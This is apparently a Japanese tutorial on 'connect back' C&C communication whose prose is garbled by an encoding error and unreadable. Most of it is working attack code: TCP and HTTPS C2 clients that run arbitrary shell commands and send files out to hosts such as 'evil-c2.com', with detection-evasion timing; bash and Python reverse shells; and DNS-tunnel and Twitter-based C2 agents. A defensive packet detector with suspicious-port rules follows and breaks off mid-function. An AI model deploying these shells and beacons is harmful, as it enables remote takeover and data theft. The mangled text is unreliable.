# ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ï¼ˆConnect Backï¼‰å…¥é–€

## ç›®æ¬¡
1. [ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ã¨ã¯](#ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ã¨ã¯)
2. [ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ã®ä»•çµ„ã¿](#ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ã®ä»•çµ„ã¿)
3. [é€šå¸¸ã®é€šä¿¡ã¨ã®é•ã„](#é€šå¸¸ã®é€šä¿¡ã¨ã®é•ã„)
4. [ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ã®ç¨®é¡](#ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ã®ç¨®é¡)
5. [æ”»æ’ƒã§ã®æ‚ªç”¨](#æ”»æ’ƒã§ã®æ‚ªç”¨)
6. [æ¤œçŸ¥ã¨å¯¾ç­–](#æ¤œçŸ¥ã¨å¯¾ç­–)
7. [æ­£å½“ãªç”¨é€”](#æ­£å½“ãªç”¨é€”)
8. [å®Ÿè£…ä¾‹](#å®Ÿè£…ä¾‹)
9. [é˜²å¾¡ç­–](#é˜²å¾¡ç­–)
10. [ç›£è¦–ã¨åˆ†æ](#ç›£è¦–ã¨åˆ†æ)

## ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ã¨ã¯

**ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ï¼ˆConnect Backï¼‰**ã¯ã€é€šå¸¸ã®é€šä¿¡æ–¹å‘ã¨ã¯é€†ã«ã€**å†…éƒ¨ã®ã‚·ã‚¹ãƒ†ãƒ ã‹ã‚‰å¤–éƒ¨ã«å‘ã‹ã£ã¦æ¥ç¶šã‚’é–‹å§‹ã™ã‚‹**é€šä¿¡æ‰‹æ³•ã§ã™ã€‚

### åŸºæœ¬æ¦‚å¿µ

```
ğŸ”„ é€šå¸¸ã®é€šä¿¡ vs ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯

é€šå¸¸ã®é€šä¿¡ï¼ˆã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ â†’ ã‚µãƒ¼ãƒãƒ¼ï¼‰:
å¤–éƒ¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ â†’ [ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«] â†’ å†…éƒ¨ã‚µãƒ¼ãƒãƒ¼
- ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒæ¥ç¶šã‚’é–‹å§‹
- ã‚µãƒ¼ãƒãƒ¼ã¯å¾…æ©ŸçŠ¶æ…‹
- ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã§åˆ¶å¾¡ã—ã‚„ã™ã„

ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ï¼ˆã‚µãƒ¼ãƒãƒ¼ â†’ å¤–éƒ¨ï¼‰:
å†…éƒ¨ã‚·ã‚¹ãƒ†ãƒ  â†’ [ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«] â†’ å¤–éƒ¨ã‚·ã‚¹ãƒ†ãƒ 
- å†…éƒ¨ã‚·ã‚¹ãƒ†ãƒ ãŒæ¥ç¶šã‚’é–‹å§‹
- å¤–éƒ¨ã‚·ã‚¹ãƒ†ãƒ ãŒå¾…æ©ŸçŠ¶æ…‹
- ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã‚’è¿‚å›ã—ã‚„ã™ã„
```

### ãªãœã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ãŒå•é¡Œã¨ãªã‚‹ã®ã‹

```
âš ï¸ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®èª²é¡Œ

1. ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«è¿‚å›
   - å†…éƒ¨ã‹ã‚‰ã®å¤–å‘ãé€šä¿¡ã¯é€šå¸¸è¨±å¯ã•ã‚Œã¦ã„ã‚‹
   - æ”»æ’ƒè€…ãŒå¤–éƒ¨ã‹ã‚‰ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ç’°å¢ƒã§ã‚‚æœ‰åŠ¹

2. æ¤œçŸ¥ã®å›°é›£ã•
   - æ­£å¸¸ãªå¤–å‘ãé€šä¿¡ã«ç´›ã‚Œã‚„ã™ã„
   - å¾“æ¥ã®å¢ƒç•Œé˜²å¾¡ã§ã¯é˜²ãã«ãã„

3. æ”»æ’ƒã®éš è”½
   - æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ãŒå¤–éƒ¨ã«ã‚ã‚‹ãŸã‚ç—•è·¡ã‚’æ¶ˆã—ã‚„ã™ã„
   - ãƒ­ã‚°ã®åˆ†æãŒå›°é›£

4. æŒç¶šçš„ãªæ¥ç¶š
   - ä¸€åº¦æ¥ç¶šãŒç¢ºç«‹ã•ã‚Œã‚‹ã¨é•·æ™‚é–“ç¶­æŒã•ã‚Œã‚‹
   - æ–­ç¶šçš„ãªé€šä¿¡ã§æ¤œçŸ¥ã‚’å›é¿
```

## ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ã®ä»•çµ„ã¿

### åŸºæœ¬çš„ãªå‹•ä½œãƒ•ãƒ­ãƒ¼

```
ğŸ“¡ ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ã®å‹•ä½œã‚·ãƒ¼ã‚±ãƒ³ã‚¹

Phase 1: æº–å‚™æ®µéš
1. æ”»æ’ƒè€…ãŒå¤–éƒ¨ã«C&Cã‚µãƒ¼ãƒãƒ¼ã‚’è¨­ç½®
2. C&Cã‚µãƒ¼ãƒãƒ¼ãŒç‰¹å®šãƒãƒ¼ãƒˆã§å¾…æ©ŸçŠ¶æ…‹ã«
3. æ¨™çš„ã‚·ã‚¹ãƒ†ãƒ ã«ãƒãƒ«ã‚¦ã‚§ã‚¢/ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’ä¾µå…¥

Phase 2: æ¥ç¶šç¢ºç«‹
4. æ¨™çš„ã‚·ã‚¹ãƒ†ãƒ å†…ã®ãƒãƒ«ã‚¦ã‚§ã‚¢ãŒèµ·å‹•
5. ãƒãƒ«ã‚¦ã‚§ã‚¢ãŒC&Cã‚µãƒ¼ãƒãƒ¼ã«æ¥ç¶šã‚’é–‹å§‹
6. å¤–å‘ããƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã‚’é€šéï¼ˆé€šå¸¸ã¯è¨±å¯ï¼‰
7. C&Cã‚µãƒ¼ãƒãƒ¼ã¨ã®é€šä¿¡ãƒãƒ£ãƒãƒ«ç¢ºç«‹

Phase 3: åˆ¶å¾¡é–‹å§‹
8. æ”»æ’ƒè€…ãŒC&Cã‚µãƒ¼ãƒãƒ¼çµŒç”±ã§æ¨™çš„ã‚’åˆ¶å¾¡
9. ã‚³ãƒãƒ³ãƒ‰å®Ÿè¡Œã€ãƒ‡ãƒ¼ã‚¿çªƒå–ç­‰ã‚’å®Ÿæ–½
10. é€šä¿¡ã‚’æš—å·åŒ–ã—ã¦æ¤œçŸ¥ã‚’å›é¿
```

### æŠ€è¡“çš„ãªå®Ÿè£…æ–¹å¼

#### 1. TCPã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯

```python
# åŸºæœ¬çš„ãªTCPã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ã®ä¾‹ï¼ˆæ•™è‚²ç›®çš„ï¼‰
import socket
import subprocess
import threading
import time

class ConnectBackClient:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.socket = None
        self.running = False
    
    def connect_to_server(self):
        """C&Cã‚µãƒ¼ãƒãƒ¼ã«æ¥ç¶š"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_ip, self.server_port))
            self.running = True
            print(f"Connected to {self.server_ip}:{self.server_port}")
            return True
        except Exception as e:
            print(f"Connection failed: {e}")
            return False
    
    def send_data(self, data):
        """ãƒ‡ãƒ¼ã‚¿ã®é€ä¿¡"""
        try:
            if self.socket:
                self.socket.send(data.encode())
        except:
            self.running = False
    
    def receive_commands(self):
        """ã‚³ãƒãƒ³ãƒ‰ã®å—ä¿¡ã¨å®Ÿè¡Œ"""
        while self.running:
            try:
                command = self.socket.recv(1024).decode().strip()
                if not command:
                    break
                
                # ã‚³ãƒãƒ³ãƒ‰å®Ÿè¡Œ
                if command.lower() == 'exit':
                    break
                elif command.lower() == 'info':
                    # ã‚·ã‚¹ãƒ†ãƒ æƒ…å ±ã®åé›†
                    import platform
                    info = f"OS: {platform.system()} {platform.release()}"
                    self.send_data(info)
                else:
                    # ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰å®Ÿè¡Œ
                    result = subprocess.run(command, shell=True, 
                                          capture_output=True, text=True)
                    output = result.stdout + result.stderr
                    self.send_data(output)
                    
            except Exception as e:
                print(f"Error: {e}")
                break
        
        self.cleanup()
    
    def cleanup(self):
        """æ¥ç¶šã®ã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒƒãƒ—"""
        self.running = False
        if self.socket:
            self.socket.close()
    
    def start(self):
        """ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯é–‹å§‹"""
        if self.connect_to_server():
            self.receive_commands()

# ä½¿ç”¨ä¾‹ï¼ˆæ•™è‚²ç›®çš„ã®ã¿ï¼‰
# client = ConnectBackClient("192.168.1.100", 4444)
# client.start()
```

#### 2. HTTPSã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯

```python
# HTTPSãƒ™ãƒ¼ã‚¹ã®ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ä¾‹
import requests
import json
import time
import subprocess
import base64
from threading import Thread

class HTTPSConnectBack:
    def __init__(self, server_url, client_id):
        self.server_url = server_url
        self.client_id = client_id
        self.session = requests.Session()
        self.running = False
        
        # User-Agentã‚’æ­£å¸¸ãªãƒ–ãƒ©ã‚¦ã‚¶ã«å½è£…
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def register_client(self):
        """ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆç™»éŒ²"""
        try:
            data = {
                'action': 'register',
                'client_id': self.client_id,
                'timestamp': int(time.time())
            }
            
            response = self.session.post(
                f"{self.server_url}/api/register",
                json=data,
                timeout=10
            )
            
            return response.status_code == 200
        except:
            return False
    
    def poll_commands(self):
        """ã‚³ãƒãƒ³ãƒ‰ã®ãƒãƒ¼ãƒªãƒ³ã‚°"""
        while self.running:
            try:
                response = self.session.get(
                    f"{self.server_url}/api/commands/{self.client_id}",
                    timeout=10
                )
                
                if response.status_code == 200:
                    commands = response.json().get('commands', [])
                    
                    for cmd in commands:
                        self.execute_command(cmd)
                
                # æ­£å¸¸ãªé–“éš”ã§ãƒãƒ¼ãƒªãƒ³ã‚°ï¼ˆæ¤œçŸ¥å›é¿ï¼‰
                time.sleep(30 + random.randint(0, 30))
                
            except Exception as e:
                time.sleep(60)  # ã‚¨ãƒ©ãƒ¼æ™‚ã¯é•·ã‚ã«å¾…æ©Ÿ
    
    def execute_command(self, command):
        """ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œ"""
        cmd_type = command.get('type')
        cmd_data = command.get('data')
        cmd_id = command.get('id')
        
        result = {'cmd_id': cmd_id, 'status': 'success', 'output': ''}
        
        try:
            if cmd_type == 'shell':
                # ã‚·ã‚§ãƒ«ã‚³ãƒãƒ³ãƒ‰å®Ÿè¡Œ
                proc = subprocess.run(cmd_data, shell=True, 
                                    capture_output=True, text=True)
                result['output'] = proc.stdout + proc.stderr
                
            elif cmd_type == 'download':
                # ãƒ•ã‚¡ã‚¤ãƒ«ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰
                with open(cmd_data, 'rb') as f:
                    file_content = base64.b64encode(f.read()).decode()
                result['output'] = file_content
                
            elif cmd_type == 'upload':
                # ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰
                file_content = base64.b64decode(cmd_data['content'])
                with open(cmd_data['filename'], 'wb') as f:
                    f.write(file_content)
                result['output'] = f"File uploaded: {cmd_data['filename']}"
                
        except Exception as e:
            result['status'] = 'error'
            result['output'] = str(e)
        
        # çµæœã‚’é€ä¿¡
        self.send_result(result)
    
    def send_result(self, result):
        """å®Ÿè¡Œçµæœã®é€ä¿¡"""
        try:
            self.session.post(
                f"{self.server_url}/api/results",
                json=result,
                timeout=10
            )
        except:
            pass
    
    def start(self):
        """ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯é–‹å§‹"""
        if self.register_client():
            self.running = True
            self.poll_commands()

# ä½¿ç”¨ä¾‹
# client = HTTPSConnectBack("https://evil-c2.com", "client_001")
# client.start()
```

## é€šå¸¸ã®é€šä¿¡ã¨ã®é•ã„

### æ¥ç¶šæ–¹å‘ã®é•ã„

| é …ç›® | é€šå¸¸ã®é€šä¿¡ | ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ |
|------|-----------|----------------|
| **æ¥ç¶šé–‹å§‹è€…** | å¤–éƒ¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ | å†…éƒ¨ã‚·ã‚¹ãƒ†ãƒ  |
| **å¾…æ©Ÿå´** | å†…éƒ¨ã‚µãƒ¼ãƒãƒ¼ | å¤–éƒ¨ã‚µãƒ¼ãƒãƒ¼ |
| **ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«** | Inboundåˆ¶å¾¡ã§é˜²å¾¡å¯èƒ½ | Outboundåˆ¶å¾¡ãŒå¿…è¦ |
| **æ¤œçŸ¥é›£æ˜“åº¦** | æ¯”è¼ƒçš„å®¹æ˜“ | å›°é›£ |
| **ãƒãƒ¼ãƒˆä½¿ç”¨** | Well-known ports | ä»»æ„ã®ãƒãƒ¼ãƒˆ |

### ãƒ—ãƒ­ãƒˆã‚³ãƒ«åˆ¥ã®ç‰¹å¾´

```
ğŸŒ ãƒ—ãƒ­ãƒˆã‚³ãƒ«åˆ¥ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯

TCP ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯:
âœ… ã‚·ãƒ³ãƒ—ãƒ«ã§é«˜é€Ÿ
âœ… åŒæ–¹å‘é€šä¿¡ãŒå¯èƒ½
âŒ ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã§æ¤œçŸ¥ã•ã‚Œã‚„ã™ã„
âŒ æš—å·åŒ–ã•ã‚Œã¦ã„ãªã„å ´åˆã¯å†…å®¹ãŒè¦‹ãˆã‚‹

HTTP/HTTPS ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯:
âœ… æ­£å¸¸ãªWebé€šä¿¡ã«å½è£…å¯èƒ½
âœ… ãƒ—ãƒ­ã‚­ã‚·ã‚µãƒ¼ãƒãƒ¼ã‚’é€šéå¯èƒ½
âœ… HTTPSä½¿ç”¨ã§æš—å·åŒ–
âŒ ãƒãƒ¼ãƒªãƒ³ã‚°æ–¹å¼ã®ãŸã‚é…å»¶ãŒã‚ã‚‹

DNS ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯:
âœ… DNSé€šä¿¡ã«å½è£…ï¼ˆæ¤œçŸ¥å›°é›£ï¼‰
âœ… å¤šãã®ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã‚’é€šé
âœ… åˆ¶é™ã®å°‘ãªã„ãƒ—ãƒ­ãƒˆã‚³ãƒ«
âŒ ãƒ‡ãƒ¼ã‚¿è»¢é€é‡ã«åˆ¶é™
âŒ å®Ÿè£…ãŒè¤‡é›‘

ICMP ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯:
âœ… pingé€šä¿¡ã«å½è£…å¯èƒ½
âœ… å¤šãã®ç’°å¢ƒã§è¨±å¯ã•ã‚Œã¦ã„ã‚‹
âŒ ãƒ‡ãƒ¼ã‚¿è»¢é€é‡ãŒéå¸¸ã«é™å®šçš„
âŒ åŒæ–¹å‘é€šä¿¡ãŒå›°é›£
```

## ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ã®ç¨®é¡

### 1. ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«

```bash
# Bash ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã®ä¾‹
#!/bin/bash

# æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã«æ¥ç¶šã—ã¦ã‚·ã‚§ãƒ«ã‚’æä¾›
exec 5<>/dev/tcp/192.168.1.100/4444
cat <&5 | while read line; do
    $line 2>&5 >&5
done
```

```python
# Python ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«
import socket
import subprocess
import os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        
        if command.startswith('cd '):
            try:
                os.chdir(command[3:])
                s.send(b'Directory changed\n')
            except:
                s.send(b'Failed to change directory\n')
        else:
            result = subprocess.run(command, shell=True, 
                                  capture_output=True, text=True)
            output = result.stdout + result.stderr
            s.send(output.encode())
    
    s.close()

# reverse_shell('192.168.1.100', 4444)
```

### 2. DNSãƒˆãƒ³ãƒãƒªãƒ³ã‚°

```python
# DNS ã‚’ä½¿ã£ãŸã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ä¾‹
import dns.resolver
import base64
import time

class DNSConnectBack:
    def __init__(self, domain):
        self.domain = domain
        self.client_id = "client001"
    
    def send_data_via_dns(self, data):
        """DNS ã‚¯ã‚¨ãƒªã§ãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡"""
        # ãƒ‡ãƒ¼ã‚¿ã‚’Base64ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰
        encoded_data = base64.b64encode(data.encode()).decode()
        
        # DNSã‚¯ã‚¨ãƒªã¨ã—ã¦é€ä¿¡
        query = f"{encoded_data}.{self.client_id}.{self.domain}"
        
        try:
            # DNSè§£æ±ºã‚’è©¦è¡Œï¼ˆå®Ÿéš›ã¯ãƒ‡ãƒ¼ã‚¿é€ä¿¡ï¼‰
            dns.resolver.resolve(query, 'A')
        except:
            pass  # ã‚¨ãƒ©ãƒ¼ã¯ç„¡è¦–ï¼ˆãƒ‡ãƒ¼ã‚¿é€ä¿¡ãŒç›®çš„ï¼‰
    
    def receive_commands_via_dns(self):
        """DNS TXTãƒ¬ã‚³ãƒ¼ãƒ‰ã‹ã‚‰ã‚³ãƒãƒ³ãƒ‰ã‚’å—ä¿¡"""
        query = f"cmd.{self.client_id}.{self.domain}"
        
        try:
            result = dns.resolver.resolve(query, 'TXT')
            for txt_record in result:
                command = txt_record.to_text().strip('"')
                if command:
                    return base64.b64decode(command).decode()
        except:
            pass
        
        return None
    
    def start_dns_tunnel(self):
        """DNSãƒˆãƒ³ãƒãƒªãƒ³ã‚°é–‹å§‹"""
        while True:
            command = self.receive_commands_via_dns()
            if command:
                # ã‚³ãƒãƒ³ãƒ‰å®Ÿè¡Œ
                result = subprocess.run(command, shell=True, 
                                      capture_output=True, text=True)
                output = result.stdout + result.stderr
                
                # çµæœã‚’DNSã§é€ä¿¡
                self.send_data_via_dns(output)
            
            time.sleep(30)  # 30ç§’é–“éš”ã§ãƒãƒ¼ãƒªãƒ³ã‚°

# dns_client = DNSConnectBack("evil.com")
# dns_client.start_dns_tunnel()
```

### 3. ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ãƒ¡ãƒ‡ã‚£ã‚¢çµŒç”±

```python
# Twitter API ã‚’ä½¿ã£ãŸã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ä¾‹
import tweepy
import json
import time
import subprocess

class SocialMediaConnectBack:
    def __init__(self, api_credentials):
        # Twitter APIèªè¨¼
        auth = tweepy.OAuthHandler(
            api_credentials['consumer_key'],
            api_credentials['consumer_secret']
        )
        auth.set_access_token(
            api_credentials['access_token'],
            api_credentials['access_token_secret']
        )
        
        self.api = tweepy.API(auth)
        self.bot_account = "evil_bot_account"
        self.last_tweet_id = None
    
    def check_for_commands(self):
        """ãƒ„ã‚¤ãƒ¼ãƒˆã‹ã‚‰ã‚³ãƒãƒ³ãƒ‰ã‚’ãƒã‚§ãƒƒã‚¯"""
        try:
            # ãƒ¡ãƒ³ã‚·ãƒ§ãƒ³ä»˜ããƒ„ã‚¤ãƒ¼ãƒˆã‚’å–å¾—
            mentions = self.api.mentions_timeline(
                since_id=self.last_tweet_id,
                count=10
            )
            
            for tweet in mentions:
                if tweet.user.screen_name == self.bot_account:
                    # ã‚³ãƒãƒ³ãƒ‰ã®æŠ½å‡º
                    command = tweet.text.replace(f"@{self.api.me().screen_name}", "").strip()
                    
                    if command.startswith("#exec "):
                        cmd = command[6:]  # "#exec " ã‚’é™¤å»
                        result = self.execute_command(cmd)
                        
                        # çµæœã‚’DMã§é€ä¿¡
                        self.send_result_via_dm(result)
                    
                    self.last_tweet_id = tweet.id
        except Exception as e:
            print(f"Error checking commands: {e}")
    
    def execute_command(self, command):
        """ã‚³ãƒãƒ³ãƒ‰å®Ÿè¡Œ"""
        try:
            result = subprocess.run(command, shell=True, 
                                  capture_output=True, text=True)
            return result.stdout + result.stderr
        except Exception as e:
            return f"Error: {e}"
    
    def send_result_via_dm(self, result):
        """çµæœã‚’DMã§é€ä¿¡"""
        try:
            # é•·ã„çµæœã¯åˆ†å‰²ã—ã¦é€ä¿¡
            max_length = 280
            for i in range(0, len(result), max_length):
                chunk = result[i:i+max_length]
                self.api.send_direct_message(
                    recipient_screen_name=self.bot_account,
                    text=chunk
                )
                time.sleep(1)  # ãƒ¬ãƒ¼ãƒˆåˆ¶é™å¯¾ç­–
        except Exception as e:
            print(f"Error sending result: {e}")
    
    def start_monitoring(self):
        """ç›£è¦–é–‹å§‹"""
        while True:
            self.check_for_commands()
            time.sleep(60)  # 1åˆ†é–“éš”ã§ãƒã‚§ãƒƒã‚¯

# ä½¿ç”¨ä¾‹
# credentials = {
#     'consumer_key': 'your_key',
#     'consumer_secret': 'your_secret',
#     'access_token': 'your_token',
#     'access_token_secret': 'your_token_secret'
# }
# 
# social_client = SocialMediaConnectBack(credentials)
# social_client.start_monitoring()
```

## æ”»æ’ƒã§ã®æ‚ªç”¨

### APTæ”»æ’ƒã§ã®ä½¿ç”¨ä¾‹

```
ğŸ¯ é«˜åº¦æŒç¶šçš„è„…å¨ï¼ˆAPTï¼‰ã§ã®ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯

å…¸å‹çš„ãªæ”»æ’ƒã‚·ãƒŠãƒªã‚ª:

Phase 1: åˆæœŸä¾µå…¥
- ã‚¹ãƒ”ã‚¢ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ãƒ¡ãƒ¼ãƒ«ã§ãƒãƒ«ã‚¦ã‚§ã‚¢é…å¸ƒ
- è„†å¼±æ€§ã‚’çªã„ãŸä¾µå…¥
- æ°´é£²ã¿å ´æ”»æ’ƒ

Phase 2: ãƒãƒƒã‚¯ãƒ‰ã‚¢è¨­ç½®
- ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯æ©Ÿèƒ½ã‚’æŒã¤ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«
- æ­£å½“ãªãƒ—ãƒ­ã‚»ã‚¹ã«å½è£…
- ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚„ã‚µãƒ¼ãƒ“ã‚¹ã«è‡ªå‹•èµ·å‹•ã‚’è¨­å®š

Phase 3: C&Cé€šä¿¡ç¢ºç«‹
- å¤–éƒ¨ã®C&Cã‚µãƒ¼ãƒãƒ¼ã«å®šæœŸçš„ã«æ¥ç¶š
- æš—å·åŒ–é€šä¿¡ã§æ¤œçŸ¥ã‚’å›é¿
- è¤‡æ•°ã®é€šä¿¡ãƒãƒ£ãƒãƒ«ã‚’ç¢ºä¿

Phase 4: å†…éƒ¨æ´»å‹•
- æ¨©é™æ˜‡æ ¼
- æ¨ªå±•é–‹ï¼ˆãƒ©ãƒ†ãƒ©ãƒ«ãƒ ãƒ¼ãƒ–ãƒ¡ãƒ³ãƒˆï¼‰
- ãƒ‡ãƒ¼ã‚¿åé›†ãƒ»çªƒå–
- é•·æœŸé–“ã®æ½œä¼
```

### å®Ÿéš›ã®æ”»æ’ƒäº‹ä¾‹

```
ğŸ“° å®Ÿéš›ã®ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯æ”»æ’ƒäº‹ä¾‹

1. Cobalt Strike
   - å•†ç”¨ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆãƒ„ãƒ¼ãƒ«
   - æ”»æ’ƒè€…ã«æ‚ªç”¨ã•ã‚Œã‚‹
   - HTTPSãƒ“ãƒ¼ã‚³ãƒ³ã§ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯
   - æ­£å¸¸ãªé€šä¿¡ã«å½è£…

2. Metasploit Meterpreter
   - ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«æ©Ÿèƒ½
   - å¤šæ§˜ãªé€šä¿¡æ–¹å¼
   - ã‚¹ãƒ†ãƒ¼ã‚¸ãƒ³ã‚°æ©Ÿèƒ½
   - æ°¸ç¶šåŒ–æ©Ÿèƒ½

3. PowerShell Empire
   - PowerShellãƒ™ãƒ¼ã‚¹ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯
   - HTTPSã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯
   - ãƒ¡ãƒ¢ãƒªå†…å®Ÿè¡Œ
   - ãƒ­ã‚°å›é¿æ©Ÿèƒ½

4. å›½å®¶æ”¯æ´å‹æ”»æ’ƒã‚°ãƒ«ãƒ¼ãƒ—
   - APT1, APT28, APT29ç­‰
   - ã‚«ã‚¹ã‚¿ãƒ ãƒãƒƒã‚¯ãƒ‰ã‚¢
   - é•·æœŸé–“ã®æ½œä¼
   - é«˜åº¦ãªæ¤œçŸ¥å›é¿
```

## æ¤œçŸ¥ã¨å¯¾ç­–

### 1. ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ç›£è¦–ã«ã‚ˆã‚‹æ¤œçŸ¥

```python
# ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ç•°å¸¸æ¤œçŸ¥ã‚¹ã‚¯ãƒªãƒ—ãƒˆ
import scapy.all as scapy
import time
from collections import defaultdict, deque
import threading

class ConnectBackDetector:
    def __init__(self):
        self.connection_log = defaultdict(list)
        self.suspicious_patterns = []
        self.monitoring = False
        
        # æ¤œçŸ¥ãƒ«ãƒ¼ãƒ«
        self.rules = {
            'unusual_ports': [4444, 5555, 6666, 7777, 8888, 9999],
            'suspicious_domains': ['pastebin.com', 'hastebin.com'],
            'beacon_interval_threshold': 5,  # ç§’
            'connection_frequency_threshold': 10  # å›/åˆ†
        }
    
    def analyze_packet(self, packet):
        """ãƒ‘ã‚±ãƒƒãƒˆåˆ†æ"""
        if packet.haslayer(scapy.TCP):
            src_ip = packet[scapy.IP].src
            dst_ip = packet[scapy.IP].dst
            dst_port = packet[scapy.TCP].dport
            
            # å¤–å‘ãæ¥ç¶šã®æ¤œçŸ¥
            if self.is_internal_ip(src_ip) and not self.is_internal_ip(dst_ip):
                self.log_outbound_connection(src_ip, dst_ip, dst_port)
                
                # æ€ªã—ã„ãƒãƒ¼ãƒˆã¸ã®æ¥ç¶š
                if dst_port in self.rules['unusual_ports']:
                    self.alert(f"Suspicious outbound connection to port {dst_port}: {src_ip} -> {dst_ip}")
                
                # æ¥ç¶šé »åº¦ã®åˆ†æ
                self.analyze_connection_frequency(src_ip, dst_ip, dst_port)
    
    def is_internal_ip(self, ip):
        """å†…éƒ¨IPã‚¢ãƒ‰ãƒ¬ã‚¹ã®åˆ¤å®š"""
        internal_ranges = [
            '192.168.', '10.', '172.16.', '172.17.', '172.18.',
            '172.19.', '172.20.', '172.21.', '172.22.', '172.23.',
            '172.24.', '172.25.', '172.26.', '172.27.', '172.28.',
            '172.29.', '172.30.', '172.31.'
        ]
        return any(ip.startswith(range_) for range_ in internal_ranges)
    
    def log_outbound_connection(self, src_ip, dst_ip, dst_port):
        """å¤–å‘ãæ¥ç¶šã®ãƒ­ã‚°è¨˜éŒ²"""
        timestamp = time.time()
        connection_key = f"{src_ip}:{dst_ip}:{dst_port}"
        
        self.connection_log[connection_key].append(timestamp)
        
        # å¤ã„ãƒ­ã‚°ã®å‰Šé™¤ï¼ˆ1æ™‚é–“ä»¥ä¸Šå‰ï¼‰
        cutoff_time = timestamp - 3600
        self.connection_log[connection_key] = [
            t for t in self.connection_log[connection_key] 
            if t > cutoff_time
        ]
    
    def analyze_connection_frequency(self, src_ip, dst_ip, dst_port):
        """æ¥ç¶šé »åº¦ã®åˆ†æ"""
        connection_key = f"{src_ip}:{dst_ip}:{dst_port}"
        connections = self.connection_log[connection_key]
        
        if len(connections) < 3:
            return
        
